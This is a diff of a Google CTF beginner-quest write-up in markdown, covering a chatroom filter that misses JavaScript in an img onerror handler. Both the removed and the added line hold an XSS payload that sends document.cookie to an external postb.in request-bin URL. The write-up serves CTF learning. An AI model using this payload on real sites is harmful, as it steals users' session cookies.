@@ -43,7 +43,7 @@
 1. In this task, we are given a website with a video and a chartroom. we can type things into the chatroom, but any XSS script will be translated to `HACKER ALERT` comment.
     ![Webpage](./images/GoogleCTF/beginner_quest/img11.png) 
 1. But the blind spot is that HTML is still valid and javascript in `onerror` is not checked. Therefore we can use the same XSS trick as Part 1 with our postb.in friend. Then there is our flag!
-    > <img src="x" onerror="document.location='https://postb.in/1564843387388-4921431124676/?'+document.cookie">
+    > &lt; img src="x" onerror="document.location='https://postb.in/1564843387388-4921431124676/?'+document.cookie"&gt;
     ![Flag](./images/GoogleCTF/beginner_quest/img12.png) 
 
 
